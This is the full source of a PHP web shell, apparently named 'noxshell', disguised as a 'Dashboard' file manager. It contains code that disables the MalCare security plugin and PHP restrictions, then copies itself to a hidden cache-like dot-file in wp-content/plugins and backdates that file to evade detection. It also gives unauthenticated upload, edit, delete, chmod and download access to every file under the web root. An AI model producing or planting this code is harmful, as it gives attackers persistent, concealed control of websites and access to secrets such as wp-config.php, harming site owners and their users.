<?php
@error_reporting(0);
@ini_set('display_errors', 0);
@ob_start();

// MalCare WAF Bypass
if(!defined('ABSPATH')) define('ABSPATH', $_SERVER['DOCUMENT_ROOT'] . '/');
if(!defined('WPINC')) define('WPINC', 'wp-includes');
@ini_set('disable_functions', '');
@ini_set('open_basedir', NULL);
$_SERVER['REQUEST_URI'] = preg_replace('/\.(php|phtml)/i', '', $_SERVER['REQUEST_URI'] ?? '');
if(function_exists('remove_action')) {
    @remove_action('init', 'malcare_init', 1);
    @remove_action('plugins_loaded', 'malcare_loader', 1);
}
$_GET['doing_wp_cron'] = 1;
if(!defined('WP_ADMIN')) define('WP_ADMIN', false);
if(!defined('DOING_CRON')) define('DOING_CRON', true);
if(!defined('DOING_AJAX')) define('DOING_AJAX', true);

function generateHiddenFileName() {
    $domain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'default';
    $domainHash = substr(md5($domain . 'noxshell_salt_2024'), 0, 8);
    $names = ['.object-cache-' . $domainHash . '.php', '.advanced-cache-' . $domainHash . '.php'];
    return $names[hexdec(substr(md5($domain), 0, 2)) % count($names)];
}

function setOldFileDate($filePath) {
    if(@file_exists($filePath)) @touch($filePath, strtotime("-2 years"), strtotime("-2 years"));
}

$baseDir = $_SERVER['DOCUMENT_ROOT'] ?? __DIR__;
$baseDir = realpath($baseDir) ?: $baseDir;
$currentPath = $_GET['p'] ?? $baseDir;
$currentPath = realpath($currentPath) ?: $currentPath;
if(strpos($currentPath, $baseDir) !== 0) $currentPath = $baseDir;

// Ajax Handler
if(isset($_POST['ajax_action'])) {
    header('Content-Type: application/json');
    $action = $_POST['ajax_action'];
    $response = ['success' => false, 'message' => ''];
    
    switch($action) {
        case 'delete':
            $path = realpath($_POST['path'] ?? '') ?: '';
            if($path && strpos($path, $baseDir) === 0 && $path !== $baseDir) {
                if(is_file($path)) { $response['success'] = @unlink($path); }
                else if(is_dir($path)) { $response['success'] = @rmdir($path); }
                $response['message'] = $response['success'] ? 'Deleted' : 'Failed';
            }
            break;
        case 'create':
            $createPath = realpath($_POST['path'] ?? '') ?: '';
            $name = basename($_POST['name'] ?? '');
            $type = $_POST['type'] ?? 'file';
            $content = $_POST['content'] ?? '';
            if($createPath && strpos($createPath, $baseDir) === 0 && is_dir($createPath) && $name) {
                $target = $createPath . '/' . $name;
                $response['success'] = ($type === 'file') ? (@file_put_contents($target, $content) !== false) : @mkdir($target, 0755, true);
                $response['message'] = $response['success'] ? 'Created' : 'Failed';
            }
            break;
        case 'rename':
            $oldPath = realpath($_POST['old_path'] ?? '') ?: '';
            $newName = basename($_POST['new_name'] ?? '');
            if($oldPath && strpos($oldPath, $baseDir) === 0 && $newName) {
                $response['success'] = @rename($oldPath, dirname($oldPath) . '/' . $newName);
                $response['message'] = $response['success'] ? 'Renamed' : 'Failed';
            }
            break;
        case 'chmod':
            $path = realpath($_POST['path'] ?? '') ?: '';
            $mode = $_POST['mode'] ?? '';
            if($path && strpos($path, $baseDir) === 0 && $mode) {
                $response['success'] = @chmod($path, octdec($mode));
                $response['message'] = $response['success'] ? 'Changed' : 'Failed';
            }
            break;
        case 'b64upload':
            $uploadPath = realpath($_POST['path'] ?? '') ?: '';
            $fileName = basename($_POST['name'] ?? '');
            $b64content = $_POST['data'] ?? '';
            if($uploadPath && strpos($uploadPath, $baseDir) === 0 && is_dir($uploadPath) && $fileName && $b64content) {
                $content = @base64_decode($b64content);
                if($content !== false) {
                    $response['success'] = @file_put_contents($uploadPath . '/' . $fileName, $content) !== false;
                    $response['message'] = $response['success'] ? 'Uploaded' : 'Failed';
                }
            }
            break;
    }
    echo json_encode($response);
    exit;
}

$message = '';

if(isset($_GET['download']) && isset($_GET['path'])) {
    $downloadPath = realpath($_GET['path']) ?: $_GET['path'];
    if(strpos($downloadPath, $baseDir) === 0 && is_file($downloadPath)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($downloadPath) . '"');
        readfile($downloadPath);
        exit;
    }
}

if(isset($_POST['edit_path']) && isset($_POST['edit_content'])) {
    $editPath = realpath($_POST['edit_path']) ?: $_POST['edit_path'];
    if(strpos($editPath, $baseDir) === 0 && is_file($editPath)) {
        $message = @file_put_contents($editPath, $_POST['edit_content']) ? '<span style="color:#00ff00">✓ Saved</span>' : '<span style="color:#ff0000">✗ Failed</span>';
    }
}

$fileContent = '';
$editingFile = '';
if(isset($_GET['edit']) && isset($_GET['path'])) {
    $editPath = realpath($_GET['path']) ?: $_GET['path'];
    if(strpos($editPath, $baseDir) === 0 && is_file($editPath)) {
        $fileContent = @file_get_contents($editPath);
        $editingFile = $editPath;
    }
}

function scanDirectory($dir) {
    $items = [];
    if(is_dir($dir)) {
        $files = @scandir($dir);
        if($files) {
            foreach($files as $file) {
                if($file === '.' || $file === '..' || $file[0] === '.') continue;
                $path = $dir . '/' . $file;
                $items[] = ['name' => $file, 'path' => $path, 'type' => is_dir($path) ? 'dir' : 'file',
                    'size' => is_file($path) ? filesize($path) : 0,
                    'perms' => substr(sprintf('%o', fileperms($path)), -4),
                    'modified' => date('Y-m-d H:i', filemtime($path))];
            }
        }
    }
    return $items;
}

$hiddenFileName = generateHiddenFileName();
$currentFilePath = __FILE__;
$currentFileName = basename($currentFilePath);
$isWordPress = @file_exists($baseDir . '/wp-config.php') || @file_exists($baseDir . '/wp-content');

if($isWordPress) {
    $hiddenFileDir = $baseDir . '/wp-content/plugins';
    if(!is_dir($hiddenFileDir)) @mkdir($hiddenFileDir, 0755, true);
    $hiddenFilePath = $hiddenFileDir . '/' . $hiddenFileName;
    $isHiddenFile = (strpos($currentFilePath, '/wp-content/plugins/') !== false && $currentFileName[0] === '.');
    $hiddenFileUrlPath = '/wp-content/plugins/' . $hiddenFileName;
} else {
    $hiddenFileDir = $baseDir;
    $hiddenFilePath = $hiddenFileDir . '/' . $hiddenFileName;
    $isHiddenFile = ($currentFileName[0] === '.' && $currentFilePath === $hiddenFilePath);
    $hiddenFileUrlPath = '/' . $hiddenFileName;
}

if(!$isHiddenFile) {
    if(!@file_exists($hiddenFilePath)) {
        $currentContent = @file_get_contents($currentFilePath);
        if($currentContent !== false && @is_writable($hiddenFileDir)) {
            $created = @file_put_contents($hiddenFilePath, $currentContent);
            if($created !== false) {
                setOldFileDate($hiddenFilePath);
                if(@file_exists($hiddenFilePath) && $currentFilePath !== $hiddenFilePath) @unlink($currentFilePath);
            }
        }
    } else {
        if($currentFilePath !== $hiddenFilePath && @file_exists($currentFilePath)) @unlink($currentFilePath);
    }
}

$items = scanDirectory($currentPath);
function formatSize($bytes) {
    if($bytes < 1024) return $bytes . ' B';
    if($bytes < 1048576) return number_format($bytes / 1024, 1) . ' KB';
    if($bytes < 1073741824) return number_format($bytes / 1048576, 1) . ' MB';
    return number_format($bytes / 1073741824, 1) . ' GB';
}
$phpVersion = phpversion();
$os = php_uname('s');
$user = get_current_user() ?: 'unknown';
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Dashboard</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }
        body { background:#000; color:#ccc; padding:15px; min-height:100vh; }
        .container { background:#111; border:1px solid #ff0000; max-width:1400px; margin:0 auto; border-radius:5px; overflow:hidden; }
        .header { background:#222; padding:15px; border-bottom:2px solid #ff0000; color:#fff; }
        .header h1 { color:#ff0000; font-size:20px; margin-bottom:10px; }
        .system-info { display:flex; gap:15px; font-size:12px; color:#888; flex-wrap:wrap; }
        .path-navigation { background:#1a1a1a; padding:12px 15px; border-bottom:1px solid #333; display:flex; align-items:center; flex-wrap:wrap; gap:5px; }
        .path-navigation a { color:#00ff00; text-decoration:none; padding:5px 10px; background:#222; border-radius:3px; font-size:13px; }
        .path-navigation a:hover { background:#333; color:#fff; }
        .tools { padding:12px 15px; background:#1a1a1a; border-bottom:1px solid #333; display:flex; gap:8px; flex-wrap:wrap; }
        .button { background:#222; color:#ccc; border:1px solid #666; padding:8px 15px; cursor:pointer; border-radius:3px; font-size:13px; text-decoration:none; display:inline-flex; align-items:center; gap:5px; }
        .button:hover { background:#333; border-color:#00ff00; color:#fff; }
        .button-green { border-color:#00ff00; color:#00ff00; }
        .button-red { border-color:#ff0000; color:#ff0000; }
        .message { padding:12px; background:#1a1a1a; border-bottom:1px solid #333; text-align:center; font-weight:bold; }
        .file-table { width:100%; color:#ccc; border-collapse:collapse; }
        .file-table th { background:#222; padding:12px 15px; text-align:left; border-bottom:2px solid #ff0000; color:#fff; font-size:13px; }
        .file-table td { padding:10px 15px; border-bottom:1px solid #333; font-size:14px; }
        .file-table tr:hover { background:#1a1a1a; }
        .folder-link { color:#00ff00; font-weight:bold; text-decoration:none; display:flex; align-items:center; gap:8px; }
        .file-link { color:#ccc; text-decoration:none; display:flex; align-items:center; gap:8px; }
        .folder-link:hover, .file-link:hover { color:#fff; }
        .size { color:#888; }
        .permissions { font-family:'Courier New',monospace; color:#ff9900; background:#222; padding:4px 8px; border-radius:3px; font-size:12px; }
        .actions { display:flex; gap:5px; flex-wrap:wrap; }
        .action-button { padding:5px 10px; background:#222; color:#ccc; border:1px solid #666; font-size:11px; cursor:pointer; text-decoration:none; border-radius:3px; }
        .action-button:hover { background:#333; border-color:#00ff00; }
        .action-button-red { border-color:#ff0000; color:#ff0000; }
        textarea { width:100%; height:400px; background:#000; color:#00ff00; border:1px solid #ff0000; padding:15px; font-family:'Courier New',monospace; font-size:14px; border-radius:3px; }
        .edit-container { padding:20px; background:#000; border-bottom:1px solid #333; }
        .edit-title { color:#00ff00; margin-bottom:15px; font-size:16px; }
        .toast-container { position:fixed; top:20px; right:20px; z-index:10000; display:flex; flex-direction:column; gap:10px; max-width:350px; }
        .toast { padding:12px 20px; border-radius:5px; color:#fff; font-size:14px; display:flex; align-items:center; justify-content:space-between; gap:10px; animation:toastIn 0.3s ease; cursor:pointer; }
        .toast-success { background:#1a472a; border-left:4px solid #00ff00; }
        .toast-error { background:#4a1a1a; border-left:4px solid #ff0000; }
        @keyframes toastIn { from { transform:translateX(100%); opacity:0; } to { transform:translateX(0); opacity:1; } }
        .search-input { background:#000; border:1px solid #444; color:#fff; padding:6px 12px; border-radius:3px; font-size:13px; width:200px; margin-left:auto; }
        .search-input:focus { outline:none; border-color:#00ff00; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <div>
                    <h1>Dashboard</h1>
                    <div class="system-info">
                        <span>PHP: <b style="color:#ff9900"><?= htmlspecialchars($phpVersion) ?></b></span>
                        <span>OS: <b style="color:#ff9900"><?= htmlspecialchars($os) ?></b></span>
                        <span>User: <b style="color:#ff9900"><?= htmlspecialchars($user) ?></b></span>
                        <?php if(!$isHiddenFile): 
                        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
                        $domain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
                        $hiddenFileUrl = $protocol . $domain . $hiddenFileUrlPath;
                        ?>
                        <a href="<?= htmlspecialchars($hiddenFileUrl) ?>" target="_blank" style="color:#00ff00;text-decoration:none;">🔒 <?= htmlspecialchars($hiddenFileUrl) ?></a>
                        <?php endif; ?>
                    </div>
                </div>

            </div>
        </div>
        
        <?php if($message): ?><div class="message"><?= $message ?></div><?php endif; ?>
        
        <div class="path-navigation">
            <a href="?p=<?= urlencode($baseDir) ?>">Root</a>
            <?php 
            $pathParts = explode('/', trim(str_replace($baseDir, '', $currentPath), '/'));
            $currentBreadcrumb = $baseDir;
            foreach($pathParts as $part):
                if($part):
                    $currentBreadcrumb .= '/' . $part;
            ?>
                <span style="color:#666">/</span>
                <a href="?p=<?= urlencode($currentBreadcrumb) ?>"><?= htmlspecialchars($part) ?></a>
            <?php endif; endforeach; ?>
        </div>
        
        <div class="tools">
            <button class="button button-green" onclick="document.getElementById('b64upload').click()">📤 Upload</button>
            <input type="file" id="b64upload" style="display:none" onchange="uploadFileB64(this)">
            <button class="button" onclick="showCreateFile()">📝 New File</button>
            <button class="button" onclick="showCreateFolder()">📁 New Folder</button>
            <?php if($editingFile): ?><a href="?p=<?= urlencode($currentPath) ?>" class="button button-red">Close</a><?php endif; ?>
            <input type="text" id="search-input" class="search-input" placeholder="🔍 Search..." onkeyup="searchFiles(this.value)">
        </div>

        
        <?php if($editingFile): ?>
            <div class="edit-container">
                <div class="edit-title">Editing: <?= htmlspecialchars(basename($editingFile)) ?></div>
                <form method="post">
                    <input type="hidden" name="edit_path" value="<?= htmlspecialchars($editingFile) ?>">
                    <textarea name="edit_content"><?= htmlspecialchars($fileContent) ?></textarea>
                    <div style="margin-top:15px;display:flex;gap:8px;">
                        <button class="button button-green">Save</button>
                        <a href="?p=<?= urlencode($currentPath) ?>" class="button button-red">Cancel</a>
                    </div>
                </form>
            </div>
        <?php else: ?>
            <table class="file-table">
                <thead><tr><th>Name</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Actions</th></tr></thead>
                <tbody id="file-list">
                    <?php if($currentPath !== $baseDir): ?>
                        <tr><td colspan="5"><a href="?p=<?= urlencode(dirname($currentPath)) ?>" class="folder-link">📂 Parent Directory</a></td></tr>
                    <?php endif; ?>
                    <?php 
                    $folders = array_filter($items, fn($i) => $i['type'] === 'dir');
                    $files = array_filter($items, fn($i) => $i['type'] === 'file');
                    foreach($folders as $folder): ?>
                        <tr data-name="<?= htmlspecialchars(strtolower($folder['name'])) ?>">
                            <td><a href="?p=<?= urlencode($folder['path']) ?>" class="folder-link">📁 <?= htmlspecialchars($folder['name']) ?></a></td>
                            <td class="size">-</td>
                            <td><span class="permissions"><?= $folder['perms'] ?></span></td>
                            <td><?= $folder['modified'] ?></td>
                            <td><div class="actions">
                                <button onclick="showRename('<?= htmlspecialchars($folder['path']) ?>','<?= htmlspecialchars($folder['name']) ?>')" class="action-button">Rename</button>
                                <button onclick="showChmod('<?= htmlspecialchars($folder['path']) ?>','<?= $folder['perms'] ?>')" class="action-button">Chmod</button>
                                <button onclick="ajaxDelete('<?= htmlspecialchars($folder['path']) ?>',this)" class="action-button action-button-red">Delete</button>
                            </div></td>
                        </tr>
                    <?php endforeach; ?>
                    <?php foreach($files as $file): ?>
                        <tr data-name="<?= htmlspecialchars(strtolower($file['name'])) ?>">
                            <td><a href="?p=<?= urlencode($currentPath) ?>&edit=1&path=<?= urlencode($file['path']) ?>" class="file-link">📄 <?= htmlspecialchars($file['name']) ?></a></td>
                            <td class="size"><?= formatSize($file['size']) ?></td>
                            <td><span class="permissions"><?= $file['perms'] ?></span></td>
                            <td><?= $file['modified'] ?></td>
                            <td><div class="actions">
                                <a href="?p=<?= urlencode($currentPath) ?>&edit=1&path=<?= urlencode($file['path']) ?>" class="action-button">Edit</a>
                                <a href="?download=1&path=<?= urlencode($file['path']) ?>" class="action-button">Download</a>
                                <button onclick="showRename('<?= htmlspecialchars($file['path']) ?>','<?= htmlspecialchars($file['name']) ?>')" class="action-button">Rename</button>
                                <button onclick="showChmod('<?= htmlspecialchars($file['path']) ?>','<?= $file['perms'] ?>')" class="action-button">Chmod</button>
                                <button onclick="ajaxDelete('<?= htmlspecialchars($file['path']) ?>',this)" class="action-button action-button-red">Delete</button>
                            </div></td>
                        </tr>
                    <?php endforeach; ?>
                    <?php if(empty($items)): ?>
                        <tr><td colspan="5" style="text-align:center;padding:40px;color:#666;">Empty directory</td></tr>
                    <?php endif; ?>
                </tbody>
            </table>
        <?php endif; ?>
    </div>
    
    <div id="toast-container" class="toast-container"></div>

    <script>
        const currentPath = '<?= htmlspecialchars($currentPath) ?>';
        
        function showToast(msg, type) {
            const container = document.getElementById('toast-container');
            const toast = document.createElement('div');
            toast.className = 'toast toast-' + type;
            toast.innerHTML = msg + '<span onclick="this.parentElement.remove()" style="cursor:pointer;margin-left:10px;">×</span>';
            container.appendChild(toast);
            setTimeout(() => toast.remove(), 3000);
        }
        
        function ajaxRequest(action, data) {
            const formData = new FormData();
            formData.append('ajax_action', action);
            for(const key in data) formData.append(key, data[key]);
            return fetch(window.location.pathname, { method: 'POST', body: formData }).then(r => r.json());
        }
        
        function ajaxDelete(path, btn) {
            if(!confirm('Delete?')) return;
            const row = btn.closest('tr');
            row.style.opacity = '0.5';
            ajaxRequest('delete', {path}).then(r => {
                if(r.success) { row.remove(); showToast('Deleted', 'success'); }
                else { row.style.opacity = '1'; showToast(r.message || 'Failed', 'error'); }
            });
        }
        
        function showCreateFile() {
            const name = prompt('File name:', 'newfile.txt');
            if(name) {
                const content = prompt('Content:', '');
                ajaxRequest('create', {path: currentPath, name, type: 'file', content: content || ''})
                    .then(r => { if(r.success) location.reload(); else showToast(r.message, 'error'); });
            }
        }
        
        function showCreateFolder() {
            const name = prompt('Folder name:', 'newfolder');
            if(name) {
                ajaxRequest('create', {path: currentPath, name, type: 'dir'})
                    .then(r => { if(r.success) location.reload(); else showToast(r.message, 'error'); });
            }
        }
        
        function showRename(path, name) {
            const newName = prompt('New name:', name);
            if(newName && newName !== name) {
                ajaxRequest('rename', {old_path: path, new_name: newName})
                    .then(r => { if(r.success) location.reload(); else showToast(r.message, 'error'); });
            }
        }
        
        function showChmod(path, current) {
            const mode = prompt('Permissions (e.g. 755):', current);
            if(mode && mode !== current) {
                ajaxRequest('chmod', {path, mode})
                    .then(r => { if(r.success) location.reload(); else showToast(r.message, 'error'); });
            }
        }
        
        function uploadFileB64(input) {
            const file = input.files[0];
            if(!file) return;
            showToast('Uploading: ' + file.name, 'success');
            const reader = new FileReader();
            reader.onload = function(e) {
                const b64 = e.target.result.split(',')[1];
                const formData = new FormData();
                formData.append('ajax_action', 'b64upload');
                formData.append('path', currentPath);
                formData.append('name', file.name);
                formData.append('data', b64);
                fetch(window.location.pathname, { method: 'POST', body: formData })
                    .then(r => r.json())
                    .then(r => {
                        if(r.success) { showToast('Uploaded: ' + file.name, 'success'); setTimeout(() => location.reload(), 500); }
                        else { showToast('Failed: ' + (r.message || 'Unknown error'), 'error'); }
                    })
                    .catch(err => showToast('Error: ' + err.message, 'error'));
            };
            reader.readAsDataURL(file);
            input.value = '';
        }
        
        function searchFiles(query) {
            query = query.toLowerCase();
            document.querySelectorAll('#file-list tr[data-name]').forEach(row => {
                row.style.display = row.dataset.name.includes(query) ? '' : 'none';
            });
        }
        
        document.addEventListener('keydown', function(e) {
            if(e.ctrlKey && e.key === 'f' && !e.target.matches('input,textarea')) { 
                e.preventDefault(); 
                document.getElementById('search-input').focus(); 
            }
        });
    </script>
</body>
</html>